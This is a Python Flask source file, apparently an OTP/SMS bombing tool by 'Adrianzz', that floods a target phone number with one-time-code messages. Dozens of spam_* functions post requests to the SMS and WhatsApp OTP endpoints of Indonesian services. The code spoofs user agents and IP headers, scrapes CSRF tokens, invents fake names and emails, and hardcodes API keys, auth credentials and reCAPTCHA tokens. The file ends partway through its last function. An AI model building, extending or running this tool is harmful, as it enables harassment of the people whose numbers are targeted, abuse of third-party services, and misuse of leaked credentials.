# ═══════════════════════════════════════════════════════════════
# DARKNESS KEGELAPAN API OTP — By Adrianzz
# ═══════════════════════════════════════════════════════════════
import os
import re
import time
import uuid
import random
import hashlib
import string
import json
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, request, jsonify
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# ═══════════════ USER AGENTS ═══════════════
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A546E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
]

def ua():
    return random.choice(USER_AGENTS)

def normalize_phone(phone):
    p = re.sub(r'\D', '', str(phone))
    if p.startswith('0'):
        return p
    elif p.startswith('62'):
        return '0' + p[2:]
    elif p.startswith('+62'):
        return '0' + p[3:]
    return p

def intl_phone(phone):
    p = normalize_phone(phone)
    if p.startswith('0'):
        return '+62' + p[1:]
    return '+62' + p


# ═══════════════════════════════════════════════════════════════
#                        OTP FUNCTIONS
# ═══════════════════════════════════════════════════════════════

def spam_astra_daihatsu(phone):
    try:
        p = normalize_phone(phone)
        url = "https://data-web.tam-icm.com/api/public/vendors/register"
        headers = {"Accept":"application/json, text/plain, */*","Content-Type":"application/json","Origin":"https://www.toyota.astra.co.id","Referer":"https://www.toyota.astra.co.id/","User-Agent":ua()}
        r = requests.post(url, json={"phoneNumber": p}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_carro_co(phone):
    try:
        p = normalize_phone(phone)
        msisdn = '+62' + p[1:] if p.startswith('0') else '+62' + p
        url = "https://carro.co/_actions/requestOtp"
        headers = {"Accept":"application/json","Content-Type":"application/json","Origin":"https://carro.co","Referer":"https://carro.co/id","User-Agent":ua()}
        r = requests.post(url, json={"countryCode":"id","locale":"id","mobileNumber":msisdn,"provider":"whatsapp","recaptchaAction":"id_idid_requestotp","recaptchaResponse":"03AFcWeA41o202JUPXmK9YzzE_8W96M"}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_carro_sso(phone):
    try:
        p = normalize_phone(phone)
        phone_no = p[1:] if p.startswith('0') else p
        url = "https://api.sso.carro.co/api/login/mobile"
        headers = {"Accept":"application/json","Content-Type":"application/json","Origin":"https://sso.carro.co","Referer":"https://sso.carro.co/","User-Agent":ua()}
        r = requests.post(url, json={"phone_code":"62","phone_no":phone_no,"send_via":"whatsapp"}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_swiggy(phone):
    try:
        p = normalize_phone(phone); mobile = p[1:] if p.startswith('0') else p
        url = "https://www.swiggy.com/mapi/auth/signup"
        headers = {"Accept":"*/*","Content-Type":"application/json","Origin":"https://www.swiggy.com","Referer":"https://www.swiggy.com/auth/register","User-Agent":ua()}
        r = requests.post(url, json={"name":"wtf","email":"","password":"","referral_code":"","mobile":mobile,"countryCode":"62"}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_thebodyshop_wa(phone):
    try:
        p = normalize_phone(phone)
        identifier = '62' + p[1:] if p.startswith('0') else p if p.startswith('62') else '62' + p
        url = "https://ms-api.thebodyshop.co.id/users/v1/otp/request"
        headers = {"Accept":"application/json","Content-Type":"application/json","Origin":"https://www.thebodyshop.co.id","Referer":"https://www.thebodyshop.co.id/","User-Agent":ua()}
        r = requests.post(url, json={"identifier":identifier,"otpType":"WA"}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_thebodyshop_sms(phone):
    try:
        p = normalize_phone(phone)
        identifier = '62' + p[1:] if p.startswith('0') else p if p.startswith('62') else '62' + p
        url = "https://ms-api.thebodyshop.co.id/users/v1/otp/request"
        headers = {"Accept":"application/json","Content-Type":"application/json","Origin":"https://www.thebodyshop.co.id","Referer":"https://www.thebodyshop.co.id/","User-Agent":ua()}
        r = requests.post(url, json={"identifier":identifier,"otpType":"SMS"}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_tokopedia(phone):
    try:
        p = normalize_phone(phone); phone_number = p if p.startswith('0') else '0' + p
        query = "mutation OTPRequestV2($input: OTPRequestInput!) { OTPRequest(input: $input) { success message errorMessage } }"
        payload = {"query":query,"variables":{"input":{"phoneNumber":phone_number,"via":"WA"}}}
        url = "https://gql.tokopedia.com/graphql/OTPRequest"
        headers = {"Accept":"*/*","Content-Type":"application/json","Origin":"https://www.tokopedia.com","Referer":"https://www.tokopedia.com/register/","User-Agent":ua()}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_topindoku(phone):
    try:
        p = normalize_phone(phone); phone_str = p if p.startswith('0') else '0' + p
        url = "https://www.top-indo.com/api/register/otp-request"
        headers = {"Accept":"*/*","Content-Type":"application/json","Origin":"https://www.top-indo.com","Referer":"https://www.top-indo.com/register","User-Agent":ua()}
        r = requests.post(url, json={"uuid":str(uuid.uuid4()),"phone":phone_str,"via":"WA","hash":"gruenbf12d2"}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def _spam_flip(phone, channel):
    try:
        p = normalize_phone(phone)
        msisdn = '+62' + p[1:] if p.startswith('0') else '+62' + p
        url = "https://customer.flip.id/web/user-auth/api/v3.1/otp"
        headers = {"Accept":"*/*","Content-Type":"application/json","Origin":"https://flip.id","Referer":"https://flip.id/","User-Agent":ua()}
        r = requests.post(url, json={"channel":channel,"credential":msisdn,"device_identifier":str(uuid.uuid4()),"phone_number":msisdn,"type":12}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_flip_sms(phone):
    return _spam_flip(phone, "via-sms-by-service")

def spam_flip_wa(phone):
    return _spam_flip(phone, "via-wa-by-service")

def spam_skulid_sms(phone):
    try:
        p = normalize_phone(phone); msisdn = '62' + p[1:] if p.startswith('0') else '62' + p
        url = "https://api2.skul.id/v2/otp/request"
        headers = {"Accept":"application/json","Authorization":"Bearer undefined","Origin":"https://my.skul.id","Referer":"https://my.skul.id/","User-Agent":ua()}
        r = requests.post(url, data={"phone":msisdn,"type":"register","channel":"sms","stakeholder":""}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_starlite(phone):
    try:
        p = normalize_phone(phone)
        url = "https://starliteindonesia.com/api/customer-registration/phone-otp/request"
        headers = {"Accept":"application/json","Content-Type":"application/json","Origin":"https://starliteindonesia.com","Referer":"https://starliteindonesia.com/?register=active","User-Agent":ua(),"X-Api-Key":"280999IFTTH"}
        r = requests.post(url, json={"phone_number":p}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_eraspace(phone):
    try:
        import hashlib
        p = normalize_phone(phone); msisdn = '62' + p[1:] if p.startswith('0') else '62' + p
        device_id = str(uuid.uuid4()); epoch = str(int(time.time()))
        signature = hashlib.sha256(f"{device_id}|eraspace|{epoch}".encode()).hexdigest()
        url = "https://jeanne.eraspace.com/customers/v3/otp/request"
        headers = {"Accept":"application/json","Authorization":"Basic Y3VzdGJhc2ljOk9MV2llWlVvQlA=","Content-Type":"application/json","Device-id":device_id,"Epoch":epoch,"Origin":"https://eraspace.com","Referer":"https://eraspace.com/","Signature":signature,"User-Agent":ua()}
        r = requests.post(url, json={"identifier":msisdn,"regionCode":"ID","type":"identifier_validation"}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_pinhomefix(phone):
    try:
        p = normalize_phone(phone); phone_number = p[1:] if p.startswith('0') else p
        s = requests.Session()
        s.get("https://www.pinhome.id/daftar", headers={"User-Agent":ua()}, timeout=10)
        csrf = s.cookies.get('X7kCsrf') or "v4.local.t_ptNAXqCfG4kJzbUe7Ek1jCW8VC"
        url = "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp"
        headers = {"Accept":"*/*","Content-Type":"text/plain;charset=UTF-8","Origin":"https://www.pinhome.id","Referer":"https://www.pinhome.id/daftar","User-Agent":ua(),"X-Csrf-Token":csrf}
        r = s.post(url, json={"applicationType":"Pinhome Web","countryCode":"62","otpType":"register","accountType":"customers","phoneNumber":phone_number}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_misteraladinfix(phone):
    try:
        p = normalize_phone(phone); phone_number = p[1:] if p.startswith('0') else p
        s = requests.Session()
        s.get("https://m.misteraladin.com/register", headers={"User-Agent":ua()}, timeout=10)
        xsrf = s.cookies.get('XSRF-TOKEN') or "7f48cbc3ecccddd3675c018595ab122749844a38618dc8259dd9a72223f05449"
        name = f"{random.choice(['Andi','Budi','Cici','Dewi','Eko'])} {random.choice(['Santoso','Wijaya','Pratama'])}"
        url = "https://m.misteraladin.com/web-api/members/auth/otp-request"
        headers = {"Accept":"application/json","Content-Type":"application/json","Origin":"https://m.misteraladin.com","Referer":"https://m.misteraladin.com/register","User-Agent":ua(),"X-Xsrf-Token":xsrf}
        r = s.post(url, json={"phone_number":phone_number,"phone_number_country_code":62,"fullname":name,"pages":None,"type":"register"}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_yogyagroup_smsonly(phone):
    try:
        p = normalize_phone(phone)
        s = requests.Session(); base = "https://yokitchen-new.yogyagroup.com"
        g = s.get(f"{base}/register", headers={"User-Agent":ua()}, timeout=10)
        m = re.search(r'<input[^>]*name="_token"[^>]*value="([^"]+)"', g.text)
        token = m.group(1) if m else "zBVC42Choz42VKyTtt90V9mpfliuYKJZNd4bNwat"
        name = f"{random.choice(['Andi','Budi'])} {random.choice(['Santoso','Wijaya'])}"
        url = f"{base}/register/request-otp"
        headers = {"Accept":"application/json","Origin":base,"Referer":f"{base}/register","User-Agent":ua()}
        files = {"token":(None,token),"full_name":(None,name),"phone_number":(None,p),"birthday":(None,"2000-01-01"),"tnc":(None,"on")}
        r = s.post(url, files=files, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_tiptip(phone):
    try:
        p = normalize_phone(phone)
        phone_plus = '+62' + p[1:] if p.startswith('0') else '+62' + p
        ip = random.choice(['27.124.95.190','103.150.45.1','114.10.120.56'])
        fp = '-'.join(''.join(random.choices('0123456789abcdef', k=n)) for n in (14,14,6,5,14))
        url = "https://api.tiptip.id/authentication/guest/v1/phone/otp/send"
        headers = {"Accept":"application/json","Channel":"WEB","Channel-App-Version":"2.27.30","Channel-Fingerprint":fp,"Channel-Fingerprint-Additional":"b3c922e09ddfd89237bf35d47070bed1","Content-Type":"application/json","Country-Code":"ID","Ip-Address":ip,"Language":"id","Origin":"https://tiptip.id","Referer":"https://tiptip.id/sign-up?ref=%2F","Request-Id":''.join(random.choices('0123456789abcdef', k=8)),"User-Agent":ua()}
        r = requests.post(url, json={"action":"SIGN_UP","delivery_method":"WA","phone_number":phone_plus}, headers=headers, timeout=15)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_duniagames(phone):
    try:
        p = normalize_phone(phone)
        url = "https://api.duniagames.co.id/api/user/api/v2/user/send-otp"
        headers = {"Accept":"application/json","Content-Type":"application/json","User-Agent":ua(),"Referer":"https://duniagames.co.id/","Origin":"https://duniagames.co.id"}
        r = requests.post(url, json={"phoneNumber":intl_phone(p),"userName":p}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_rumah123(phone):
    try:
        p = normalize_phone(phone); msisdn = '62' + p[1:] if p.startswith('0') else p
        url = "https://www.rumah123.com/api/otp/request-otp"
        headers = {"Accept":"application/json","Content-Type":"application/json;charset=utf-8","User-Agent":ua(),"Origin":"https://www.rumah123.com","Referer":"https://www.rumah123.com/user/login"}
        r = requests.post(url, json={"ipAddress":random.choice(['27.124.95.226','27.124.95.227']),"phoneNumber":msisdn,"portalId":1,"type":"WHATSAPP","url":"https://www.rumah123.com/user/login"}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def _mitsubishi(phone, method):
    try:
        p = normalize_phone(phone)
        s = requests.Session()
        g = s.get("https://mymitsubishiapps.com/register", headers={"User-Agent":ua()}, timeout=10)
        m = re.search(r'<meta name="csrf-token" content="([^"]+)"', g.text)
        token = m.group(1) if m else "dpcXhamymrLsqUnek2hWzHbE2u8B0J4rsl3lE008"
        url = "https://mymitsubishiapps.com/v2/register"
        headers = {"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","Accept":"application/json","X-CSRF-TOKEN":token,"User-Agent":ua(),"Origin":"https://mymitsubishiapps.com","Referer":"https://mymitsubishiapps.com/register"}
        r = s.post(url, data={"_token":token,"type":method,"value":p,"accept_privacy_policy":"1","newsletter":"1"}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_mitsubishi_sms(phone):
    return _mitsubishi(phone, "phone")

def spam_mitsubishi_wa(phone):
    return _mitsubishi(phone, "whatsapp")

def spam_ira(phone):
    try:
        p = normalize_phone(phone)
        url = "https://internetrakyat.id/api/app/auth/send-otp-register"
        headers = {"Accept":"application/json","Content-Type":"application/json","x-api-key":"280999!FTTH","User-Agent":ua(),"Origin":"https://internetrakyat.id","Referer":"https://internetrakyat.id/"}
        r = requests.post(url, json={"phone_number":p,"recaptcha_token":"0cAFcWeA41o202JUPXmK9YzzE_8W96M_0NTxZro8xo"}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_sahabat_daihatsu(phone):
    try:
        p = normalize_phone(phone); msisdn = '62' + p[1:] if p.startswith('0') else p
        s = requests.Session()
        s.get("https://www.astra-daihatsu.id/register", headers={"User-Agent":ua()}, timeout=10)
        url = "https://www.astra-daihatsu.id/otp/whatsapp/generate"
        headers = {"Accept":"application/json","Content-Type":"application/json","Origin":"https://www.astra-daihatsu.id","Referer":"https://www.astra-daihatsu.id/register","User-Agent":ua()}
        r = s.post(url, json={"phoneNo":msisdn}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def _uangme(phone, send_type):
    try:
        p = normalize_phone(phone); account = p[1:] if p.startswith('0') else p
        s = requests.Session()
        s.cookies.set('_gcl_au','1.1.1647819770.1785554645')
        url = "https://h5.uangme.id/api/v2/sms_code"
        headers = {"Accept":"application/json","App_version":"999999","Lan":"id-ID","User-Agent":ua()}
        r = s.get(url, params={"send_type":send_type,"phone":account,"scene_type":"login"}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_uangme_sms(phone):
    return _uangme(phone, "sms")

def spam_uangme_wa(phone):
    return _uangme(phone, "whatsapp")

def spam_greensm(phone):
    try:
        p = normalize_phone(phone); msisdn = '+62' + p[1:] if p.startswith('0') else '+62' + p
        name = f"{random.choice(['Andi','Budi','Cici'])} {random.choice(['Santoso','Wijaya'])}"
        url = "https://gapi.indo.greensm.com/car/acquisition/create-registration"
        headers = {"Accept":"application/json","Content-Type":"application/json","Origin":"https://driver-registration.indo.greensm.com","Referer":"https://driver-registration.indo.greensm.com/","User-Agent":ua()}
        payload = {"HiringSource":"Direkomendasikan oleh pengemudi lain","Education":"Pendidikan","City":"JB","Country":"ID","Name":name,"Tel":msisdn,"ReferralCode":"","Source":"","Type":"EXTERNAL","WorkExperience":"Sopir kontrak","Campaign":"","AffiliateNumber":""}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_bonusbelanja(phone):
    try:
        p = normalize_phone(phone); msisdn = '62' + p[1:] if p.startswith('0') else p
        name = f"{random.choice(['Andi','Budi','Adrianzz'])} {random.choice(['Santoso','Ganteng'])}"
        url = "https://www.bonusbelanja.com/api/auth/registration/app"
        headers = {"Accept":"*/*","Accept-Language":"id-ID","Content-Type":"application/json","Origin":"https://www.bonusbelanja.com","Referer":"https://www.bonusbelanja.com/register","User-Agent":ua()}
        r = requests.post(url, json={"phone":msisdn,"name":name,"agreeTnc":True,"agreeContact":True}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_99co(phone):
    try:
        p = normalize_phone(phone); msisdn = '+62' + p[1:] if p.startswith('0') else '+62' + p
        jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImZmNWExYzY3LWIxYzMtNGRlNi1hNzIyLWNiNjE4MzgwYjVlMiJ9.7jP0_h7mJkYQn5k42K1T6_g9Zg4302-m4_8N4T8O_m4"
        url = "https://www.99us.cc/api/v1/messaging/otp/send-otp-v2"
        headers = {"Accept":"application/json","Authorization":f"Bearer {jwt}","Content-Type":"application/json","Origin":"https://www.99us.cc","Referer":"https://www.99us.cc/register/otp-verification","User-Agent":ua()}
        r = requests.post(url, json={"brand":"9910","destination_address":msisdn,"type_id":2}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_planetban(phone):
    try:
        p = normalize_phone(phone); msisdn = '62' + p[1:] if p.startswith('0') else p
        url = "https://api.planetban.com/website/customer/request-otp"
        headers = {"Content-Type":"application/json","Origin":"https://planetban.com","Referer":"https://planetban.com/","User-Agent":ua(),"Accept":"application/json, text/plain, */*"}
        r = requests.post(url, json={"name":"Test","phone":msisdn,"password":"Test123","purpose":"register","method":"whatsapp"}, headers=headers, timeout=15)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_singa(phone):
    try:
        p = normalize_phone(phone); msisdn = '62' + p[1:] if p.startswith('0') else p
        url = "https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.7&versionCode=143&model=SM-S928B&systemVersion=14&platform=android&appsflyer_id="
        headers = {"Content-Type":"application/json; charset=utf-8","User-Agent":ua()}
        r = requests.post(url, json={"mobile_phone":msisdn,"type":"mobile","is_switchable":1}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_uangme_com_v2(phone):
    try:
        p = normalize_phone(phone); msisdn = '62' + p[1:] if p.startswith('0') else p
        url = f"https://api.uangme.com/api/v2/sms_code?phone={msisdn}&scene_type=login&send_type=wp"
        headers = {"v":"1","version":"28","User-Agent":ua()}
        r = requests.get(url, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_adiraku(phone):
    try:
        p = normalize_phone(phone); msisdn = '0' + p[2:] if p.startswith('62') else p
        url = "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata"
        headers = {"Content-Type":"application/json; charset=utf-8","User-Agent":ua()}
        r = requests.post(url, json={"mobileNumber":msisdn,"type":"prospect-create","channel":"whatsapp"}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_tokopedia_v2(phone):
    try:
        p = normalize_phone(phone)
        msisdn = '62' + p[1:] if p.startswith('0') else p
        s = requests.Session()
        r0 = s.get(f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={msisdn}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister",
                   headers={"User-Agent":ua()}, timeout=10)
        m = re.search(r'<input\s+id="Token"\s+value="([^"]+)"', r0.text)
        if not m:
            return False
        r = s.post("https://accounts.tokopedia.com/otp/c/ajax/request-wa",
                   data={"otp_type":"116","msisdn":msisdn,"tk":m.group(1),"email":"","original_param":"","user_id":"","signature":"","number_otp_digit":"6"},
                   headers={"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With":"XMLHttpRequest","User-Agent":ua()}, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_duniagames_v2(phone):
    try:
        p = normalize_phone(phone)
        msisdn = '62' + p[1:] if p.startswith('0') else p
        url = "https://api.duniagames.co.id/api/user/api/v2/user/send-otp"
        headers = {"accept":"application/json, text/plain, */*","content-type":"application/json",
                   "ciam-type":"FR","origin":"https://duniagames.co.id","referer":"https://duniagames.co.id/",
                   "x-device":str(uuid.uuid4()),"user-agent":ua()}
        r = requests.post(url, json={"phoneNumber":'+'+msisdn,"userName":"0"+p[1:] if p.startswith('0') else p}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_planetban_v2(phone):
    try:
        p = normalize_phone(phone); msisdn = '0' + p[2:] if p.startswith('62') else p
        url = "https://api.planetban.com/website/customer/request-otp"
        headers = {"accept":"application/json, text/plain, */*","content-type":"application/json",
                   "origin":"https://planetban.com","referer":"https://planetban.com/","user-agent":ua()}
        r = requests.post(url, json={"phone":msisdn,"purpose":"register","method":"whatsapp"}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_rumah123_v2(phone):
    try:
        p = normalize_phone(phone)
        nomor = p[1:] if p.startswith('0') else (p[2:] if p.startswith('62') else p)
        s = requests.Session()
        url = "https://www.rumah123.com/api/otp/request-otp"
        headers = {"User-Agent":ua(),"Referer":"https://www.rumah123.com/user/login",
                   "Accept":"application/json, text/plain, */*","Content-Type":"application/json;charset=UTF-8",
                   "Base-Url-Core":"https://www.rumah123.com"}
        r = s.post(url, json={"cancelledRequestId":"","phoneNumber":f"62{nomor}","portalId":1,"type":"WHATSAPP"}, headers=headers, timeout=10, verify=False)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_paperid(phone):
    try:
        import string
        p = normalize_phone(phone); nomor_format = '62' + p[1:] if p.startswith('0') else p
        s = requests.Session()
        user = ''.join(random.choices(string.ascii_lowercase, k=8)); email = f"{user}@gmail.com"
        fprint = 'A20dt' + ''.join(random.choices('abcdef0123456789', k=15))
        reqid = ''.join(random.choices('abcdef0123456789', k=32))
        h = {"request-id":reqid,"user-agent":ua(),"content-type":"application/json"}
        s.post("https://mail.paper.id/api/validate-mail", json={"email":email}, headers=h, timeout=10)
        s.post("https://api.paper.id/api/v1/auth/login/check", json={"fingerprint":fprint,"email":email}, headers=h, timeout=10)
        s.post("https://api.paper.id/api/v1/auth/fingerprints/check", json={"action":"register","email":email,"phone":nomor_format,"fingerprint":fprint}, headers=h, timeout=10)
        h2 = {"request-id":reqid,"user-agent":ua(),"x-paper-user-agent":"Jupiter/7.10.13 mobile_web (linux) Chrome 146","content-type":"application/json","origin":"https://www.paper.id","referer":"https://www.paper.id/"}
        r = s.post("https://register.paper.id/api/v1/auth/register/send-otp", json={"phone":nomor_format,"method":"whatsapp","registered_by":"web"}, headers=h2, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_jogjakita_v2(phone):
    try:
        p = normalize_phone(phone)
        nomor = '62' + p[1:] if p.startswith('0') else (p[1:] if p.startswith('+62') else (p if p.startswith('62') else '62' + p))
        s = requests.Session()
        auth = s.post("https://aci-user.bmsecure.id/oauth/token",
                      data={"grant_type":"client_credentials","uuid":"00000000-0000-0000-0000-000000000000",
                            "id_user":"0","id_kota":"0","location":"0.0,0.0","via":"jogjakita_user",
                            "version_code":"501","version_name":"6.10.1"},
                      headers={"authorization":"Basic OGVjMzFmODctOTYxYS00NTFmLThhOTUtNTBlMjJlZGQ2NTUyOjdlM2Y1YTdlLTViODYtNGUxNy04ODA0LWQ3NzgyNjRhZWEyZQ==",
                               "Content-Type":"application/x-www-form-urlencoded","User-Agent":ua()}, timeout=10)
        try:
            token = auth.json().get('access_token')
        except:
            return False
        if not token:
            return False
        r = s.post("https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send",
                   json={"phone_user":nomor,"primary_credential":{"device_id":"","fcm_token":"","id_kota":0,"id_user":0,"location":"0.0,0.0","uuid":"","version_code":"501","version_name":"6.10.1","via":"jogjakita_user"},"uuid":str(uuid.uuid4()),"version_code":"501","version_name":"6.10.1","via":"jogjakita_user"},
                   headers={"Content-Type":"application/json; charset=UTF-8","Authorization":f"Bearer {token}","User-Agent":ua()}, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_bliblitiket(phone):
    try:
        p = normalize_phone(phone); nomor = '+62' + p[1:] if p.startswith('0') else '+62' + p
        s = requests.Session()
        reqid = ''.join(random.choices('abcdef0123456789', k=32))
        headers = {"accept":"*/*","x-channel-id":"MWEB","x-client-id":"3ca1ed67701249861819ba4850f4f135","x-entity":"BLIBLI","x-lang":"id","x-request-id":reqid,"user-agent":ua()}
        s.get("https://account.bliblitiket.com/register", headers={"user-agent":headers["user-agent"]}, timeout=10)
        headers["content-type"] = "text/plain;charset=UTF-8"
        headers["origin"] = "https://account.bliblitiket.com"
        headers["referer"] = "https://account.bliblitiket.com/register"
        r = s.post("https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate",
                   data='{"action":"REGISTER_OTP","channel":"WHATS_APP","recipient":"' + nomor + '","recaptchaToken":""}',
                   headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_yogyaonline_v2(phone):
    try:
        p = normalize_phone(phone); msisdn = '0' + p[2:] if p.startswith('62') else p
        s = requests.Session()
        s.get("https://www.yogyaonline.co.id/register", headers={"user-agent":ua()}, timeout=10)
        headers = {"accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","origin":"https://www.yogyaonline.co.id","referer":"https://www.yogyaonline.co.id/register","user-agent":ua(),"x-requested-with":"XMLHttpRequest"}
        r = s.post("https://www.yogyaonline.co.id/api/v1/send-otp", json={"phone_number":msisdn}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_saturdays(phone):
    try:
        p = normalize_phone(phone); msisdn = '0' + p[2:] if p.startswith('62') else p
        url = "https://beta.api.saturdays.com/api/v1/user/otp/send"
        headers = {"x-api-key":"GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj","Content-Type":"application/json","User-Agent":ua()}
        r = requests.post(url, json={"number":msisdn,"country_code":"+62","type":""}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_kreditpintar(phone):
    try:
        p = normalize_phone(phone); nomor = '+62' + p[1:] if p.startswith('0') else '+62' + p
        uuid_val = str(uuid.uuid4())
        url = "https://go.kreditpintar.com/api/auth/send-code?channel=OFFICIAL2021&lang=id"
        headers = {"Content-Type":"application/json","Pintar-ID-Cash":f"Pintar-ID-Cash (WebAndroid;;;id) uuid/{uuid_val} version/0.1.0","User-Agent":ua()}
        r = requests.post(url, json={"mobileNumber":nomor,"type":"SMS"}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_bunda(phone):
    try:
        p = normalize_phone(phone); msisdn = p[1:] if p.startswith('0') else p
        url = "https://cms.bunda.co.id/api/v1/auth/send-otp"
        headers = {"accept":"application/json, text/plain, */*","content-type":"application/json","origin":"https://www.bunda.co.id","referer":"https://www.bunda.co.id/id","user-agent":ua(),"x-locale":"id"}
        r = requests.post(url, json={"phone_number":int(msisdn),"type":"auth"}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_daihatsu_v2(phone):
    try:
        p = normalize_phone(phone); msisdn = '62' + p[1:] if p.startswith('0') else p
        s = requests.Session()
        r0 = s.get("https://www.astra-daihatsu.id/register", headers={"user-agent":ua()}, timeout=10)
        m = re.search(r'name="CSRFToken"\s+value="([^"]+)"', r0.text)
        csrf = m.group(1) if m else ''
        if not csrf:
            return False
        r = s.post("https://www.astra-daihatsu.id/otp/whatsapp/generate",
                   json={"phoneNo":msisdn},
                   headers={"accept":"application/json, text/javascript, */*; q=0.01","content-type":"application/json; charset=UTF-8","csrftoken":csrf,"origin":"https://www.astra-daihatsu.id","referer":"https://www.astra-daihatsu.id/register","x-requested-with":"XMLHttpRequest","user-agent":ua()}, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_maulagi(phone):
    try:
        p = normalize_phone(phone); msisdn = '0' + p[2:] if p.startswith('62') else p
        url = "https://api.maulagi.id/api/v2/auth/check"
        headers = {"accept":"application/json, text/plain, */*","content-type":"application/json","origin":"https://maulagi.id","referer":"https://maulagi.id/","user-agent":ua(),"x-ml-key":"E32VCHXX32"}
        r = requests.post(url, json={"credentials":msisdn}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_byu(phone):
    try:
        p = normalize_phone(phone); nomor = p[2:] if p.startswith('62') else (p[1:] if p.startswith('0') else p)
        rid = str(uuid.uuid4())
        url = "https://pidaw-app.cx.byu.id/api/v3/user-service/v6/id/en-US/WEB/signin/otp"
        headers = {"accept":"application/json","content-type":"application/json","origin":"https://pidaw-webfront.cx.byu.id","referer":"https://pidaw-webfront.cx.byu.id/","slocation":"CL","x-deviceid":"17776076111271930882471","x-request-id":rid,"user-agent":ua()}
        r = requests.post(url, json={"identifier":nomor,"channel":"web"}, headers=headers, timeout=10)
        return 200 <= r.status_code <= 299
    except:
        return False

def spam_otp_astradaihatsu2_v2(phone):
    try:
        p = normalize_phone(phone); nomor_intl = '62' + p[1:] if p.startswith('0') else (p[1:] if p.startswith('+62') else p)
        s = requests.Session()
        r0 = s.get("https://www.astra-daihatsu.id/register", headers={"user-agent":ua()}, timeout=10)
